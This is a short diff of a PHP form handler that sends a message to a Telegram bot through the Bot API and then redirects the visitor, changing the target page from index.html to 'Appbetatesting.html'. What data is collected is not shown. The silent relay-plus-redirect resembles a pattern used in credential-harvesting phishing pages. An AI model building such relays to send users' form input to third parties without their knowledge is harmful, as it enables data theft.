@@ -15,6 +15,6 @@ $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$me
 file_get_contents($url);
 
 // Kembali ke halaman utama setelah data dikirim
-header("Location: index.html");
+header("Location: Appbetatesting.html");
 exit();
 ?>
